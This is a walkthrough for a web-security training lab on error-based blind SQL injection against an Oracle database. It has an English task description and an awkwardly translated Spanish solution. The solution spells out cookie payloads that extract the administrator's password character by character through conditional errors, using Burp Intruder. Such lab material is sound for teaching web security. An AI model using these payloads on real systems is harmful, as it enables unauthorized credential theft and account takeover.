This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

#### Sugerencia

Este laboratorio utiliza una base de datos Oracle. Para obtener más información, consulte el [Hoja de trucos para la inyección SQL](https://portswigger.net/web-security/sql-injection/cheat-sheet).

#### Solución

1. Visite la página principal de la tienda y utilice Burp Suite para interceptar y modificar la solicitud que contiene `TrackingId` galleta. Para simplificar, digamos que el valor original de la cookie es `TrackingId=xyz`.
2. Modificar el `TrackingId` cookie, añadiéndole una sola comilla:
    
    `TrackingId=xyz'`
    
    Verifique que se reciba un mensaje de error.
    
3. Ahora cámbialo a dos comillas:`TrackingId=xyz''`Verifique que el error desaparezca. Esto sugiere que un error de sintaxis (en este caso, la comilla no cerrada) está teniendo un efecto detectable en la respuesta.
4. Ahora debe confirmar que el servidor está interpretando la inyección como una consulta SQL, es decir, que el error es un error de sintaxis SQL a diferencia de cualquier otro tipo de error. Para hacer esto, primero debe construir una subconsulta utilizando una sintaxis SQL válida. Intente enviar:
    
    `TrackingId=xyz'||(SELECT '')||'`
    
    En este caso, observe que la consulta todavía parece no ser válida. Esto puede deberse al tipo de base de datos: intente especificar un nombre de tabla predecible en la consulta:
    
    `TrackingId=xyz'||(SELECT '' FROM dual)||'`
    
    Como ya no recibe ningún error, esto indica que el objetivo probablemente esté utilizando una base de datos Oracle, que requiere todo `SELECT` declaraciones para especificar explícitamente el nombre de una tabla.
    
5. Ahora que ha creado lo que parece ser una consulta válida, intente enviar una consulta no válida preservando al mismo tiempo una sintaxis SQL válida. Por ejemplo, intente consultar un nombre de tabla inexistente:
    
    `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`
    
    Esta vez se devuelve un error. Este comportamiento sugiere fuertemente que su inyección está siendo procesada como una consulta SQL por el back-end.
    
6. Siempre que se asegure de inyectar siempre consultas SQL sintácticamente válidas, puede utilizar esta respuesta de error para inferir información clave sobre la base de datos. Por ejemplo, para verificar que el `users` La tabla existe, envíe la siguiente consulta:
    
    `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
    
    Como esta consulta no devuelve un error, puedes inferir que esta tabla existe. Tenga en cuenta que el `WHERE ROWNUM = 1` La condición es importante aquí para evitar que la consulta devuelva más de una fila, lo que rompería nuestra concatenación.
    
7. También puedes aprovechar este comportamiento para probar las condiciones. Primero, envíe la siguiente consulta:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    Verifique que se reciba un mensaje de error.
    
8. Ahora cámbialo a:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    Verifique que el error desaparezca. Esto demuestra que se puede desencadenar un error condicionalmente a la verdad de una condición específica. El `CASE` La declaración prueba una condición y evalúa una expresión si la condición es verdadera y otra expresión si la condición es falsa. La primera expresión contiene una división por cero, lo que provoca un error. En este caso, las dos cargas útiles prueban las condiciones `1=1` y `1=2`, y se recibe un error cuando la condición es `true`.
    
9. Puede utilizar este comportamiento para probar si existen entradas específicas en una tabla. Por ejemplo, utilice la siguiente consulta para comprobar si el nombre de usuario `administrator` existe:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Verificar que la condición sea verdadera (se recibe el error), confirmando que hay un usuario llamado `administrator`.
    
10. El siguiente paso es determinar cuántos caracteres hay en la contraseña del `administrator` usuario. Para hacer esto, cambie el valor a:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Esta condición debe ser verdadera, confirmando que la contraseña tiene más de 1 carácter de longitud.
    
11. Envíe una serie de valores de seguimiento para probar diferentes longitudes de contraseñas. Enviar:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Entonces envía:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Y así sucesivamente. Puedes hacer esto manualmente usando Burp Repeater, ya que es probable que la longitud sea corta. Cuando la condición deja de ser verdadera (es decir, cuando el error desaparece), has determinado la longitud de la contraseña, que en realidad tiene 20 caracteres.
    
12. Después de determinar la longitud de la contraseña, el siguiente paso es probar el carácter en cada posición para determinar su valor. Esto implica una cantidad mucho mayor de solicitudes, por lo que debes utilizar Burp Intruder. Envíe la solicitud en la que está trabajando a Burp Intruder, utilizando el menú contextual.
13. Vaya a Burp Intruder y cambie el valor de la cookie a:
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Esto utiliza el `SUBSTR()` función para extraer un solo carácter de la contraseña y probarlo con un valor específico. Nuestro ataque recorrerá cada posición y valor posible, probando cada uno por turno.
    
14. Coloque marcadores de posición de carga útil alrededor del final `a` carácter en el valor de la cookie. Para hacer esto, seleccione solo el `a`, y haga clic en el Botón "Agregar §". Luego debería ver lo siguiente como el valor de la cookie (tenga en cuenta los marcadores de posición de la carga útil):
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
15. Para probar el personaje en cada posición, necesitarás enviar cargas útiles adecuadas en la posición de carga útil que hayas definido. Puede asumir que la contraseña contiene sólo caracteres alfanuméricos en minúsculas. En el panel lateral "Cargas útiles", verifique que esté seleccionada "Lista simple" y, en "Configuración de carga útil", agregue las cargas útiles en el rango a - z y 0 - 9. Puede seleccionarlos fácilmente utilizando el menú desplegable "Agregar de la lista".
16. Inicie el ataque haciendo clic en "Botón "Iniciar ataque".
17. Revisa los resultados del ataque para encontrar el valor del personaje en la primera posición. La aplicación devuelve un código de estado HTTP 500 cuando ocurre el error y un código de estado HTTP 200 normalmente. La columna "Estado" en los resultados de Intruder muestra el código de estado HTTP, por lo que puede encontrar fácilmente la fila con 500 en esta columna. La carga útil que se muestra para esa fila es el valor del carácter en la primera posición.
18. Ahora, simplemente necesitas volver a ejecutar el ataque para cada una de las otras posiciones de caracteres en la contraseña, para determinar su valor. Para hacer esto, regrese a la pestaña Intruso original y cambie el desplazamiento especificado de 1 a 2. Entonces deberías ver lo siguiente como valor de cookie:
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
19. Inicie el ataque modificado, revise los resultados y anote el personaje en el segundo desplazamiento.
20. Continúe este proceso probando los desplazamientos 3, 4, etc., hasta que tenga la contraseña completa.
21. En el navegador, haga clic en "Mi cuenta" para abrir la página de inicio de sesión. Utilice la contraseña para iniciar sesión como `administrator` usuario.
